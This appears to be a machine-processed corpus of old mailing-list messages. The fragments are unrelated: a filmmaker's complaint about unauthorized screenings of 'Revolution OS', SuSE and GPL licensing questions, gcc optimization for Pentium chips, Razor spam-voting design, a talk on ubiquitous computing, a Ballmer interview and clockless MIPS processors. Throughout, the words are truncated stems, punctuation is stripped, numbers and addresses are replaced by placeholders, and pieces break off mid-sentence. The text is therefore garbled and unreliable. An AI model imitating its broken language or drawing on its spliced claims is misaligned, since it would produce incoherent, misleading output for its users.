would not be avail for open view anoth sluglug member remark that my request smack of bill gate s open letter to hobbyist the bottomlin is that i did make a film about the open sourc movement but to assum that automat mean that the film is itself open sourc seem to be a littl bit of a stretch if i made a movi about the histori of vegetarian that would not automat mean i m a vegetarian i simpli thought open sourc and free softwar were compel subject worth explor and document as a result i came to admir mani aspect of the open sourc movement and chose to focu the documentari on the movement s posit histori howev i do not think i should be punish for tell the stori of free softwar and open sourc by have my intellectu properti misappropri more practic my feel about open sourc revolut os ar abundantli clear when you see the explicit copyright notic at the end of the film s credit i realiz that make a videotap copi for person us from a tv air is consid fair us i believ in a healthi fair us doctrin howev there is a big differ between view your person copi at home with a few friend and hold a publicli advertis screen on a univers campu so i freeli admit my object to unauthor screen of revolut os doe echo bill gate s letter person i believ that the creator of a piec of intellectu properti should retain the choic to open sourc their ip if the open sourc movement is not voluntari then it is realli just piraci on of the reason i am concern with unauthor group screen of the film is that my distributor is plan in a few week to begin sell vh copi of the film for educ institut us with a licens permit noncommerci larg group screen we hope to us the monei from these sale to fund the author and replic of the dvd i want to releas the dvd as soon as possibl but i cannot afford to take on

benefit the artist and onli hurt the greedi record label well in the case of revolut os there is no multin media conglomer to punish it s just me i made and financ the film on my own i have work full

 paul my apolog for be irrit on the subject i ll tone down the rhetor quot paul linehan emailaddr inde that i actual had understood prior to all thi for exampl commerci entiti with trial limit crippl edit which is no problem i don t see why that should be a problem for suse though sure the more the merrrier as far as thei re concern anyth either you or i have to sai about their motiv is specul bear that disclaim in mind here s mine thei make monei from sell box set thei re glad to make some version avail for almost unrestrict distribut not for valu via cd duplic or the internet that thei estim won t substitut for box set sale for exampl thei could have packag what i call the ftp edit in isonumb imag the fact that thei didn t suggest to me that thei see the inconveni of mirror ftp edit inumb file which at the moment ar v number number as motiv for all but the realli determin to bui box set instead likewis thei could releas a v number number current version of the evalu singl disk iso imag instead thei alwai keep it sever version behind thi again seem like an incent to bui a box set after evalu suse via the iso imag again the abov is my specul onli about their motiv all we know of a certainti is what permiss thei ve grant which ar a bit messi and complex but nonetheless quit clear those permiss as a remind appli to the suse produc compon yast yastnumb the distribut instal program and possibl other util that i don t know of thei wrote that code and have everi right to grant or withhold permiss as suit them best on can suspect what on like what i didn t understand wa that suse had proprietari extens that it wasn t prepar to allow peopl to us under the gpl or even under a freebsd style licenc hmm let s slow down here there s a persist misconcept that it s possibl to place somebodi els s work under a new licenc without hi permiss not so there is noth in copyright law that would make that possibl the copyright owner ha inher right in hi e g softwar work and is entitl to issu as mani instanc of hi code under divers licenc as he wish if he give you a copi with no licenc statement there s effect a default licenc by oper of copyright law to avoid go into a long digress let me just sai that it s a proprietari licenc by default that s why in order to have open sourc softwar at all there must be an explicit licenc from the copyright holder no linux distribut ever entail relicens peopl s softwar without their explicit permiss sinc no such relicens can occur at all you cannot get awai with take suse linux ag s work and redistribut it under what you claim to be a bsd licenc or the gpl or anyth at all other than what the copyright owner ha specifi becaus you simpli lack the right to do so claim to do it would be copyright violat i thought that the model for the like of suse wa sell support and customis rather than what i thought of as the core product i thought that the like of yast came under core mayb it work in the glori dai befor sai number i can understand that thei might want to make more monei but the wai in which thei have done it seem to me to be be against the spirit of the gpl if stallman and friend at the gpl let alon linu torvald and kernel contributor had intend to prohibit put gpled work on the same cd as proprietari on and sell the result onli via retail store plu mail order etc in shrink wrap box i m number certain thei could and would have done so guess what thei did not thei didn t even requir that anybodi give you copi of the gpled compon ever at all all thei did wa requir that if you receiv gpled softwar lawfulli then you had to be abl to get match sourc code for a limit period upon request spirit of the gpl you sai i d suggest that stallman and compani knew exactli what thei were do and that the degre of access to gpled softwar is exactli what thei had in mind all i want is the os and gnu app i wa under the impress that for those all on need wa to pai for the media and not for the code itself ai je tort mai si you ar inde under a misconcept and mai want to read the text of the gpl to verifi thi fact the gpl doe not entitl you to a copi of ani binari softwar section number provid for right to access to match sourc code if you have lawfulli receiv a copi of a cover binari that section provid three altern mechan for the distributor to provid such access and suse do actual provid exactli that access or so i think to be the case if you believ there s some gpled codebas that you can lawfulli receiv from suse whose match sourc code thei ar not make avail exactli as requir pleas tell us which codebas that is that would be suse linux ag s headach not ani of our but it might be interest to examin my understand wa that binari or whatev could be receiv for the cost of the media plu a token of on s appreci the latter be subject to agreement between the parti i wa offer a bottl of wine plu mayb a pint or two and a chat for a copi i don t know what the go rate is your understand is almost correct but not quit number the access provis of the gpl concern access to sourc code not binari number it kick in onli for peopl who ve lawfulli receiv cover binari number cover softwar mean instanc of codebas actual place under the gnu gpl by their copyright owner the mere act of place a piec of softwar on a cd rom with gpled softwar doesn t gpl it in fact the assert to the contrari is a favourit fud tactic from enemi of linux thei re forev try to convinc softwar produc that us gpled softwar in ani wai with their proprietari offer will taint their copyright and forc them to put their properti under the gpl it s simpli not so if i want support from suse that would be a differ issu and on for which i would be will to pai that s nice but thei re not offer the exact content of the box set free of charg and law to duplic redistribut or borrow for on thing as you will have notic from my earlier list of compon the box set cd rom includ quit a lot of third parti proprietari softwar suse linux ag cannot allow you or your friend to hand out copi of that softwar freeli becaus it s not their in the first place i have a friend with number number i think that i ll end up do that if you mean the number cd core set of rh number number good it s a quit decent distribut but bear in mind that the rh number number box set includ some other third parti applic whose owner would be veri upset to find them be copi or borrow i have now realis thi thank to your kind explan i can borrow them but not copi them no look it s a collect of softwar mani element of which mai not be lawfulli just given out to multipl peopl your friend instal it then not eras it but mere let you borrow the cd result in the product be instal in multipl place that s unauthoris copi and as i ve tri to explain is not the licenc term on sai trial for commerci compani x to which i object it is the wai suse appear at least to my i t peasant self to have mix up proprietari and open stuff well if you don t like suse then you probabl won t like caldera edesk xandro desktop lycori deskop lx libranet lindow or krud either depend on your criteria you also might not like red hat linux mandrak or yellow dog sinc all of those have box set

answer glibc thi got me think about gcc itself so i ask on anoth list and got a few answer most were don t even think about it but a few suggest gcc and on point me to linux from scratch why or more specif what do you mean on on hand you can optimis how gcc is compil all that will do is make it gener the exact same code just a smidg faster and sinc gcc is such a memori pig you d do better to bui more ram to up your fs cach hit and to keep gcc s heap out of swap to explain what i mean accord to the pgcc site gcc by itself is not veri good at take advantag of the pipelin featur introduc with the pentium famili the pgcc patch ar suppos to make gcc gener tighter code but your point about compil bug is well taken thi is why i am take thing slow and look into these thing as isaid the pgcc site doe not seem to have been updat in at least a year or more i am also look into gcc itself now that the number number seri is out it might be better than when the pgcc patch were written the bottom line is pentium have better instruct set than the origin number instruct that thei still support the pentium also start introduc pipelin so properli gener code can be upto number faster than equivul code that perform the same function as for why optimis gcc if it will onli produc that same code onli slightli faster the speed is base on a percentag of the total compil time the first time i compil the qt lib with onli numberm and a lot of swap it took over number hour i ve now got numberm in the box but at numbermhz ani increas distribut over such a long compil is still consider on the other side you can look into patch to gcc that affect it s code gener um ok but keep in mind that compil error suck i can t express that enough compil should just work perfectli alwai do anyth that might affect that is in my opinion insan thei re hard to trace and you d better have a deep knowledg of what s go on to either report bug to the patch develop or to fix it yourself plu my understand is that gcc would need major chang to get larg speed boost on xnumber chip my understand and i ve follow the develop of the intel famili sinc the number each gener sinc the number ha introduc better and faster instruct i e the number introduc i e e e float point instruct by incorpor an fpu on board the first few gener were flaki so intel disabl the dodgi on and sold then as numbersx i e without the fpu later gener were better thi is why you onli find slow numbersx s therefor number s with work fpu s can calcul float faster than number s but you must gener the proper code to take advantag of thi the pentium s improv the fpu logic and introduc pipelin the first gener of pentium had faulti fpu logic program into them the pentium bug but subsequ on were fine these ad instruct ar faster again then the number equivul also the pipelin need care instruct order to take full advantag of it s speed improv again someth the compil must know about to utilis to full effect accord the the pgcc site gcc doe thi poorli but that info seem to be date gccnumber number x might be better thi is on of the area i am research close to get an answer mmx ad the abil to perform matrix calcul on int s with singl instruct and us special dma featur within the pentium to speed thi up two problem with thi number int s ar not veri us for most matrix calcul float would be better number thi is not someth that can be optimis well by a compil it need to be identifi and provid for in the sourc i e not much us to anyon but make great ad copi the pentiumpro improv the pipelin enorm again a properli written compil should be abl to optimis for thi onc it can organis the code properli the piii ad mmx type instruct for float now thi is us graphic intens program can take great advantag of thi but it must be provid for in the sourc code compil can not usual optimis for thi sort of thing xfreenumb and dri ar two prime exampl that do provid for thi so the piii can run xfreenumb and dri quit a bit faster if it s compil for these sse instruct not sure what improv the pnumber introduc i think it s mostli just speed improv rather than ani execut chang so the differ between the number and the pentiummmx should yield a signific speed boost if optimis correctli there ar faster float point instruct and pipelin that need optimis for i m not sure if gcc can optimis properli for the pipelin at least the

onli date from the middl of the nineteenth centuri a less slangi wai to identifi it is to call it a squar the liter mortar board is the wooden plate usual with a handl underneath on which bricklay carri small amount of mortar a similar tool is us by plaster but thei usual call it a hawk what seem to have happen is that the similar in shape between the bricki s board and the academ cap led some

 first number number peopl will have seen the piec of spam that could ve been avoid but the other number number will never see that spam evenli distribut it mean that an averag user will onli see number of spam that s not realist becaus not everyon will get the same spam but the basic threshold can be adjust at the veri least number peopl need to vote on a given piec of mail to make a realist decis sinc there s no no vote mechan except revoc and that s after the fact onli a ye vote mechan exist and so if you receiv number ye vote then you could safe sai that you got a reason sampl the system could pretend to have never seen the piec of mail until after it determin that it wa probabl spam so instead of a rate go up increment it would take a big leap at the begin from undefin to a rel high number and then go from there so after the first group of peopl our sampler we ll sai have seen the spam no on els would ever see it as far as unsubscrib i m alwai leeri of click on the link and don t do so unless i specif rememb sign up for someth but the sampl popul will decid for themselv whether thei feel that it s spam so ultim i guess i m sai that the most effect rout would be to us a constantli chang sampl pool and just accept that there is some fraction of user that will have to see the spam in a system that depend on peopl decid whether or not someth is spam is there ani other

should otherwis be a gener algorithm gener perform begin to degrad exponenti the thing that razor should have go for it is number sai that razor ha number number peopl that activ us it i e click the spam button on their mail reader from time to time if we decid that our object is to screen number number of spam it mean that we can continu to show what appear to be a piec of spam to number number peopl and still meet our object why not just wait for number number peopl to vote that a piec of mail is inde spam befor ever acknowledg that it could potenti be spam in other word when i razor report a messag should i be abl to tell that razor ha ever even seen that messag becaus you then have a system that is ineffect to a vari degre a simplist view would be that number subscrib receiv a piec of spam that could have otherwis been avoid but the realiti is like that mani mani more individu would have receiv the piec of spam when you factor in report time by have the server pretend to never have seen it you can avoid peopl who just re report spam becaus it wa alreadi mark as spam someth that is complet useless wrong razor check will tell you if a specif piec of mail match someth alreadi in the databas if you have the system pretend to have never seen a piec of mail how do you propos peopl us the system for filter what about revoc a revoc is after the fact becaus a substanti number of peopl number number in thi exampl have alreadi decid that thei do not want that messag if it is mark as spam by all those peopl and then peopl start revok it what doe that mean it mean that the revok have an opinion that probabl doesn t mesh with the major no it mean that the peopl do the revok have a differ opinion than the number peopl who have submit it as spam rather the number peopl who have report the messag as spam constitut a major or not is someth that would have to be determin in the context of the individu messag instead of mess with it rate why not just put it on the whitelist if i want that zdnet mail and most peopl think that zdnet mail is just plain annoi then why can t i whitelist it instead of argu with everyon about whether or not it s spam you alwai have that abil correct me if i m wrong but it s not as if all mail from zdnet will be ban in the futur just that on piec so if zdnet were to chang it system to make it easier to opt out or whatev peopl would hopefulli start unsubscrib instead of click the spam button it s my opinion that it s not my job to unsubscrib to ani list that i haven t subscrib to nor is it necessarili in my best interest given that some parti send unwant commun mai util the unsubscrib request as a method of determin thei ar mail a valid address the inher problem here of cours is that someon can pretend to be number number peopl and block anyth thei choos but sai you still have a lightweight trust system built in where when thei agre with the major though thei couldn t have known becaus razor hadn t acknowledg anyth yet then your trust

of hang out with a big crowd of american comput scientist who were basic try to find some reason to live despit all evid to the contrari thei ve definit got some reason when you go to a confer which is veri high energi with a lot of paradigmat reassess go on where idea ar be flung around bodili well outsid the box well that s an impress thing but it s my principl as a sometim work journalist not to get all carri awai whenev i wit someth like that thei might well be drink their own bathwat thi sort of thing gener requir a realiti check from some other confer so i m now fresh back from colorado from the yearli meet of the high ground design convers these ar my best pal in the industri design world some dear long time friend of mine whose judgment i alwai trust and why would a scienc fiction writer trust the judgment of industri design well becaus thei re veri trendi thei re veri shrewd and veri stylish and veri hand on peopl thei re peculiarli self effac and modest yet quit imagin better yet thei re even practic so thei re kind of like scienc fiction writer onli with much better shoe usual when i go to thi high ground event i just deliv some wacko chat about popular aspect of cybercultur and then i take some worship note but i have to report that when i took them my note from the cra grand challeng in comput confer i wa bring the nois thi is the first time i have ever seen their jaw drop thei re still kinda wring their hand over the dotcom boom and the ka boom thei miss those glori dai of the world wide web becaus for them that wa the graphic design full employ act so thei re pretti broke and thei re a littl shell shock so i guess thei should join the club but when i brought them thi stuff a rather extens work out vision in worldbuild from the point of view of ubiquit comput in the numberst centuri well of cours thi is mere a scenario but to me number net smell like the futur and frankli it doesn t smell good but that s all right becaus these aren t good time these ar rather harsh dark time and in it own peculiar wai number net is a similarli harsh dark concept ubiquit comput is by no mean a new idea the gui who invent the term is dead and even hi r d lab doesn t look all that great these dai ubicomp ha been around for quit some time in the tabl napkin handwav stage but it s lack the mean motiv and opportun to get ani real world traction i believ that mai be chang if so it s mostli due to the event of septemb number after that experi ubicomp ha got motiv and opportun as it never had befor and the mean although thei ar still specul ar start to make some sens what am i talk about when i us the term ubicomp well the term is a grab bag a congel of differ technolog some ar here commerci avail off the shelf some ar in the lab and some mai be

dongl i think thi part is serious underappreci thi is the weird part of ubicomp the part that mai turn out to be it achil heel some wai to turn the damn thing off and to know it s off the problem of the author user the author administr the author access thi is like to plai out as ubicomp s function equival of the internet s intellectu properti problem in other word it s a veri seriou issu which is go to be neglect from the get go as peopl ar eagerli build the basic infrastructur then as thei lame try to build it in later thei ar go to find out that thei have inadvert poison the water stream for everybodi you don t want to wander into a kazaa and napster version of georg orwel ubiquit comput unlik inform doe not want to be free thi is not a technolog of freedom ubiquit comput want to make

number five gp global posit system been there done that number six convoi traffic i think thi is also underestim for when i start look at seriou applic for ubicomp time and again rapidli ship larg

system oh ye rugged hardwar suitabl for outdoor deploy in all condit and weather real time simul of ongo major situat toxin detector of variou kind environment monitor of almost everi sort biometr id i have a long list of these i m cross check them i m us them to build scenario on thing about number net make it veri distinct from earlier vision of ubicomp thi is not microsoft window for housekeep thi is a hard tough web that you throw down fast over dire emerg the kei concept here is that we ar final move comput out of the ivori tower for good and all no more glass box of the number no more clean abstract of cyberspac we ar deploi comput at unheard of speed into the darkest dirtiest most danger place in the world it is a resili secur apparatu for emerg that is number net now you might well argu that ubicomp is veri invas of privaci that s just what my industri design pal said about it immedi and thei were right it s been hard to find reason deploy for ubicomp in peacetim commerc and in privat home becaus it is so orwellian howev under certain circumst other social circumst do trump thi issu for instanc when you ar breath your last under a pile of earthquak rubbl you don t realli care much about privaci under your circumst what you realli want is a smart bulldoz a tourniquet and some direct pressur against your open wound and that is what number net is about or will be about should it find it wai out of the comput scienc talk shop and into daylight it is an emerg respons system for the planet s open wound and those wound exist in plenti there ar more of them all the time i rather doubt that the orwellian version of ubicomp ha much of a futur that s a scenario that i have dub terrorspac which is ubicomp in the context of airport and nuclear power site if you ve been in airport recent i believ you ar see a pretti apt earli version of terrorspac at ani random moment you can have your possess rifl through by stranger your shoe ar scan and variou small but vital object in your pocket can be confisc by semi educ secur geek thei re either pathet under train for the job in which case you certainli feel no safer or els thei ar intellig and capabl peopl in which case you piti them and wish thei had some other job for the sake of gener human happi and the gnp rather than make us ani safer terrorspac airport serv as polit indoctrin center that humili our vote popul on a broad scale thei ar meant to inur us to ever escal level of government clumsi and gener harm the difficulti with thi terrorspac approach is that airport and airlin ar go broke airport ar hemorrhag monei try to maintain thi terrorspac apparatu it is like to spread to the brittl power of nuclear power plant nuclear wast dump bio site chemic site liquid petroleum ga center and so forth that will huge increas the overhead of all these danger industri that s a veri consider tax burden so though terrorspac mai serv as a full employ program for the loyal and slightli stupid that s not go to pai off social or econom in the long run howev number net is a differ matter an air deploy number net that allow first respond to rapidli deal with fire flood and other major disast would save monei especi for the insur who ar alreadi on the rope the actual septemb number event number number wa a rare and remark thing and with fewer than number number peopl dead it s just not that big a deal as genuin catastroph go polit theolog and militarili it wa huge but a workadai number net wouldn t fret much about terror instead it would have to deal mostli with flood fire climat chang earthquak volcano and let s hope never asteroid and weapon of mass destruct so basic with number net we ar describ a social re definit of comput geek as firemen nativ twenti first centuri comput geek as muscular with it first respond type i think thi would be pretti good for the comput industri we all need to take the dysfunct physic world far more serious thi week itali s flood texa is flood colorado s on fire thi morn the brand new wilder forest around the site of the former chernobyl ar on fire spew radioact ash hither and yon chunk of antarctica the size of rhode island have fallen into the sea i could go on thi is the sort of activ that human is requir to deal with in thi new centuri if we build a success method with which to do thi those us tactic will spread across the fabric of our civil i believ thei ar alreadi spread an innov like number net will like serv as a camel s nose in the tent for a whole seri of ubicomp applic across societi i ve been specul about these new form of ubicomp and give them some flashi neolog becaus that is what scienc fiction writer bring to the tabl we build littl scenario world and make up name for them first we ve got number net then terrorspac but there ar other battlespac a term alreadi much us by the pentagon battlespac mean militari cnumberisr the revolut in militari affair i would point out that the militari unlik some sector

have no privaci children have littl privaci child proof a room against a crawl tot if you ve ever done thi you can realiz how much us it might be to have thi process autom ani two year old alwai wonder why can t mr fork and miss wall socket be friend a real time checklist at the veri least and then we re face with the interest larg scale prospect of k number net street net thi would be

offic and small offic some veri interest consum us here but in the grand scheme of thing not that big a deal safetyspac these would be militari base u n safeti zone refuge camp and disast evacu center it s fairli easi to imagin ubiquit comput as a sinist gate commun that wall off privileg area under threat but we can also think of it as import some human comfort solidar merci and safeti into variou benight area that ar sever disturb on can imagin a gorazd un safe zone version of thi new and improv of cours a black helicopt ghost over in the dead of night deploi a scatter of small drone smart

 look at my friend jonathan s compani voxeo unless you re go to run out and build a platform that execut voic xml code and can support imap etc then the easiest wai to do thi is to leverag voxeo s servic you can start build on it for free and you will pai dollarnumb number per minut for the pleasur of us test the servic httpaddr if you have about dollarnumberk to throw at the project then you can look at nuanc which ha a platform that combin voicexml vxml speech reco and the l h speech synthes which will allow you to have your email read to you by stephen hawk tellm bevoc have off the shelf servic that do thi though but from my test thei suck if i were to build thi i d spec a lightweight imap client and voicexml browser and dump them on voxeo howev you ll find thi to be extrem slow and frustrat better to us a screen phone with a wap client ian on wednesdai juli number number at number number pm mr fork wrote i wa talk to a friend todai about voic applic us a phone to get mail or info other thing ar possibl but that s what we talk about he s run a mail server call x mail or someth and it ha a web ui written with some php page i made the comment that rend an inbox list with voxml or whatev the latest thing is would be trivial with a littl plai around you could do a simpl voic app to monitor admin the mail server or you could actual get send mail thi wai the hard part is hook up to the phone system how do i get a phone to hit a voic app server that hit the http vox enabl mail server he d want to give thi back as open sourc but there is no correspond open sourc voic server or is there i ve look at bevoc it seem that talknumb is toast doe anybodi know how els thi could be done i d love to see a digit answer machin with some speech recognit built in that would proxi into a person comput for contact list mail whatnot i could call my home phone and bounc out to the web or do whatev without need a publicli avail voic server httpaddr httpaddr

 rohit wa wonder what microsoft s definit of a chief softwar architect is and consequ what microsoft think is a roadmap here you go from mr ballmer to mr gillmor to mr fork architectur is war love em or hate em at least microsoft understand that as chief sa billg overse all product strategi there ar two thing a road map can be on is just a piec of paper that tell what everyon is do and record a bunch of bottom up plan or it can be someth where we impos more broadli our vision from the top we ar not go to try to get everyth share that s a path for get everyth stop up but at the same time we ar try to take the top four or five thing we ar try to do in the longhorn wave yukon wave or the net wave and realli have enough time to have some cross cut discuss about how we make that happen bill gate is dedic full time to be chief softwar architect he also happen to be chairman of the compani but he spend most of hi time be chief softwar architect we have a bodi now that meet everi month the sltt senior leadership technic team basic the top peopl involv in the product creat strategi and we present and discuss the issu bill is drive a process for each of these wave for instanc he will ask what ar the cross cut scenario that i want and then he will get all the right product group togeth and bring these thing in front of the sltt peopl talk about what it take to be a good manag and peopl talk about be a good coach and get peopl to like you in a larg organ those thing ar import but at a certain level the most import thing you can do for your peopl to make them better is to give them a framework where thei can work in harmoni with the other peopl in the compani and from bill s perspect thi framework is the technic road map and the sltt process it is the scenario from my perspect it is the p l profit and loss structur and the multipl busi becaus given how we work give peopl a framework that get them to make the whole bigger than the sum of the part will mean we have better offer httpaddr ballmer in charg juli number number number number pm pt no on know better than microsoft ceo steve ballmer that as the net platform evolv the success of microsoft depend on how well the compani coordin it tool server and client strategi and how well it commun that vision in an interview with infoworld test center director steve gillmor and infoworld editor at larg ed scannel at microsoft fusion number ballmer discuss the progress of net chang in the compani s approach to product develop and microsoft s effort to simplifi product licens and inspir trust in custom and partner last time we talk wa two year ago at the begin of the net era so where ar we now in the net evolut let me start by talk about where i think we ar in the xml revolut first and then i will talk about where we ar with net i believ that the it industri collect decid over the last three or four year that the world wa go to be replatform with xml as the kei foundat it s not like anyon ever got togeth to decid thi but it s like magnet north where it s been clearli indic that everyon is ralli around the concept but i think the degre to which xml is pervas might still be underestim a lot of partner even at thi confer see it as b to b for big compani but it is realli about the wai softwar in gener is design it is all about the wai secur should work manag everyth is chang so to answer your direct question two year ago i might have said the juri is still out about whether xml wa go to happen we were question if it wa go to be a legitim competitor to java but now the world ha decid to embrac xml as the basi for the next gener of technolog and there ar a lot of benefit that come with it could it have been someth other than xml sure it could have it wasn t the specif technic implement it is mere the fact that it come out of internet standard it ha deeper semant abil it is all about interoper and connect so in that context where ar we with net i ll sai a coupl thing no number i would sai we have some momentum in the market we have custom us the net product line like merril lynch credit suiss mark spencer citibank and a varieti of other peopl who ar do some thing for real i feel like the degre we ar out front is in some wai smaller and in some wai larger how so smaller in the sens that everyon is talk the xml talk even sun bigger in the execut sens we ve deliv we deliv the first batch of product that realli were built xml to the core visual studio net and biztalk server and we ar get traction so i feel good about where our execut is rel to everyon els that is not to sai that other peopl aren t do some reason bolt on xml support for the stuff thei have you have some heavi lift to do to convinc your custom and partner to follow along what do you have to do to set the standard for adopt and upgrad to thi next gener we have to present the pictur that we ar behav consist within the framework of focus on custom issu and custom satisfact and trustworthi comput which we have articul now there ar some thing i would have done differ in number number hindsight i would have increas the focu on not just secur but deploy becaus a lot of the secur problem ar actual deploy problem we have the fix but sometim we can t get the tool in their hand to deploi those fix fast enough licens i know i would have given more time and there ar better wai to plan around the kind of chang we made we ar still go to have to get smart about the full ramif do you expect ani chang to be made between now and juli number to licens number number there is a lot of push back on thi no there is noth that will happen between now and juli number and we will continu to learn over time what we need to do to earn our custom trust and earn their busi i think mani of the peopl who ar push back realli don t even know the new term isn t that your fault for not educ them ye it is our fault but you meet with plenti of custom whose compani alreadi have licens and thei ar sai i think there s a problem i don t deni there ar some problem i am sure there ar some issu we will have to work on over time after juli number we ar go to see what the real issu ar i wa talk to a custom at the show who wa sai he thought there would be a problem and i told him that we just complet a deal with hi compani and that he is now univers licens and that total cost to hi compani ar now lower than thei were befor and he said oh realli so we ll go through juli number we have a lot of custom who have sign licens and i am sure we ar go to find some issu my bigger concern todai ar probabl not in the larger account but there mai be some issu we need to address among the smaller size compani and we will how doe the net initi chang the wai in hous client and server develop work togeth what we ar try to do for the health of net and the health of the compani and the saniti of the peopl who work there and the qualiti of the product we produc is to have a more orchestr ber road map of where we ar go now there ar two thing a road map can be on is just a piec of paper that tell what everyon is do and record a bunch of bottom up plan or it can be someth where we impos more broadli our vision from the top we ar not go to try to get everyth share that s a path for get everyth stop up but at the same time we ar try to take the top four or five thing we ar try to do in the longhorn wave yukon wave or the net wave and realli have enough time to have some cross cut discuss about how we make that happen bill gate is dedic full time to be chief softwar architect he also happen to be chairman of the

how we work give peopl a framework that get them to make the whole bigger than the sum of the part will mean we have better offer it seem the scenario construct is realli work for you is thi an evolut of the solut approach i would sai it is a pretti direct extrapol from the solut stuff onli i think we ar just get a littl more experi i think we us the word scenario more often and solut less becaus solut sound more like a fix thing at the end of the dai most of the thing we do ar customiz and programm and so peopl make them into the solut thei want but thei ar still scenario what will softwar deploy look like well that is a scenario becaus it involv window offic and other applic we ar work hard to make sure the whole is bigger than the sum of the part that s not to sai peopl ar alwai comfort with thi i can t even sai we will do it perfectli all we have to do is do it a lot better than we had been do it i think that would be a big step forward for the custom will thi approach cut down on some of the technolog civil war microsoft ha had in the past involv who is go to gain control of a project thi seem to be a veri democrat approach to develop i would not us the word democraci to describ it peopl have to come togeth and ultim make some decis thi is not a vote process here the agenda of what we think is import we get a lot of input but onc it is decid peopl don t get to vote with their feet we try to make a quantum leap here in term of our abil to improv pull togeth all the piec our custom want us to do that simplifi concept by unifi them the custom don t sai thei want us to do that but when we do do that thei go ahhh i get it that make sens i don t want to go to six more meet where peopl sai is your workflow strategi biztalk or what s your offic workflow strategi or why is synchron in some wai better for e mail and outlook than it is for file folder and web page to get that sort of synchron sometim to get that high level road map to work you have to build someth we don t have todai so we have been talk about unifi storag and so the best wai to get all thi stuff to work is to get them all to work just on wai then you just keep tune on set of paramet instead of have a thousand flower bloom in your fusion keynot todai you talk about who your competitor ar and it wa the usual suspect but on you didn t mention is yourself you ar compet against the last gener of your technolog alwai given that our stuff doesn t wear out or break down you can question whether it break or not ballmer grin but it doesn t break down like machineri doe to get anyon to do someth new we have to have someth interest and innov peopl think ok should we just do more upgrad or try to sell more new product we decid that user like us to do a level of system integr so thei don t have to get involv in that so take sharepoint team servic which we put in offic we could have sold team servic as a separ product and we could have introduc a new sku stock keep unit we could have decid if it should work down level with the old offic or just the new version of offic and we could do that with real time commun but we tend to like to put thing togeth integr them and then releas batch number which ar then upgrad as a form of introduc our new innov but no matter how you do it becaus our stuff doe not wear out we have to convinc peopl that some idea we have is better or more power than the older idea we had and there ar two aspect of do that on aspect is on a given product or upgrad releas doe that make sens or do we convinc you that over an nyear period of time we will have enough innov that you will want to be licens for that innov and thi is part of thi whole licens discuss we ar have we move to the new licens for two reason i would sai no number we want to simplifi our licens when we look back a year from now i guarante you that where we ar now is simpler than where we were noth is simpler dure a transit becaus thei ar learn the new and ar more familiar with the old but i think peopl will eventu realiz thi is simpler our licens got pretti complic over the year and some peopl came to not understand it all the other issu is the time of deliv our innov i don t want to have a lot of rough question from custom so when we do have new idea it s like ok should we put it in thi upgrad or that on or just have a stream of stuff that onli our best custom have access to under the term of their contract i think in the long run we have a better chanc of satisfi them with the latter than with hit them with six differ upgrad i am a fan of let the custom decid ok i want that piec or thi piec but thei ar licens for all of it so those ar the two thing we sought to do that get back to the trust issu where if you front load it that s the big lumpi upgrad and if you back load it with the vision the net number server you have a long gap in the middl where you have to sell into an untrust audienc the truth is we need to be better at both there ar some thing you can onli do big and lumpi like a new file system it s not like some sort of small user featur if you chang the file system then the storag the backup probabi those thing ar go to chang probabl the shell ought to chang the applic a lot of thing ar go to chang can you call that lumpi or you can put out four new featur in powerpoint sure that would not look lumpi to user i think we have to build trust in the model and we ar go to have to deliv more over time it will not come overnight peopl will have to see that we do a few thing that not all of our innov is lumpi that more of it come evenli and steadili peopl develop a confid and faith thei like both aspect of the model over time our support need to becom more intim involv in that stori we know that but we don t know exactli what that mean yet and thi whole notion of softwar as a servic thi is not a licens or busi discuss it s how doe softwar get rearchitect in the world of the internet i mean how mani softwar product ar fundament differ becaus of the internet not mani probabl the anti viru gui keep up the best thei ar alwai feed new viru support in i ask the audienc at fusion how mani us window updat now that s a small piec of softwar but it is big that s the consum market we ve got to get that to realli purr in the corpor market the lack of broadband build out and adopt seem to be hold up the abil for user to take advantag of some new servic you re talk about when bill gate invest in comcast cabl it trigger the babi bell to get on board with dsl what ar you do now to deal with that issu the no number thing is we have to make softwar that is so compel that peopl will start sai well of cours i am go to get broadband and number number is on of those compel featur ye it is i wa in a hotel in sun vallei utah thi week that wa not wire so i turn on my pc and xp tell me there is a wireless network avail so i connect to someth call mountain well i don t know what that is but i have a vpn into microsoft it work i don t know whose broadband i us i didn t see it in bill s room i call him up and said hei come over to my room so soon everyon is there and connect to the internet through my room we have to support all the modal whether it is gpr gener packet radio servic or number number we have to make it easi to provis from a softwar perspect for thing that go on with dsl and cabl modem and the softwar ha to want a broadband link there ar not mani thing you do where you sai i realli care about the perform if i am download powerpoint file then i want broadband so when you can do thing with speed that you otherwis can t do without speed that is go to put a lot of pressur on the broadband commun that s the weird answer the more normal answer is yeah isn t it aw there is not enough broadband and the price thei charg i agre with all that if you look at what happen in japan recent there wa a big drop it is now dollarnumb a month for dsl vroom thei have gone from almost no dsl connect a year ago to number number million or number number million subscrib so how do we make that happen in thi countri i think that is beyond us if there is enough interest where the consum ar look intens for broadband whether it is at todai s price or tomorrow s price that is go to shake out the marketplac and i think the marketplac will do a good job we just have to make it someth obviou that consum want now i happen to live in a neigborhood where there is no broadband network no dsl or cabl modem well i have a neighbor teledes chairman and co ceo craig mccaw who ha a wireless network that i think i can piggyback off of ballmer laugh so ye broadband is a bottleneck but i also think we have to look at ourslev as a softwar industri and sai aren t we too some of that bottleneck we have not built softwar that make broadband a must have microsoft ceo weigh in ballmer address a number of kei issu for custom and partner on secur and trust there ar some thing i would have done differ on coordin product

 in fact caltech sai that it actual spun out the same number of startup in number a poor time needless to sai for new ventur as it did in the boom year of number oookaaaai httpaddr iconoclast design choos mip by anthoni cataldo mai number number san jose calif a group of engin in calabasa hill ca want to turn the microprocessor world on it head by do the unthink toss out the clock and let the signal move about unencumb for those design inspir by research conduct at nearbi caltech clock ar for wimp the fulcrum microsystem inc design team isn t the first to propos an asynchron processor but presid and chief execut offic robert nunn want to be the first to take a clockless fire breath processor mainstream we realli deal with an asynchron world he said we onli make it synchron for our own conveni thi is the kind of stuff that mani in the processor industri would consid lunat fring too weird for conserv embed system design but the young processor compani and more than a dozen other like it ar anchor in the mainstream courtesi of the mip instruct set architectur more and more mip is becom the choic for maverick processor design team seek a place at the high end by field unorthodox devic and if motorola and ibm in the powerpc camp aren t care thei could see their perform leadership in the high end embed processor market snatch awai by some of these upstart in austin texa meanwhil design at anoth mip hous intrins inc aren t prepar to ditch the clock but thei ar put a new spin on some old trick such as give each gate it own clock and then let them overlap us such sleight of hand the compani hope to soon deliv risc base processor that run at an ey pop number ghz and consum just number to number watt fulcrum intrins and their brethren 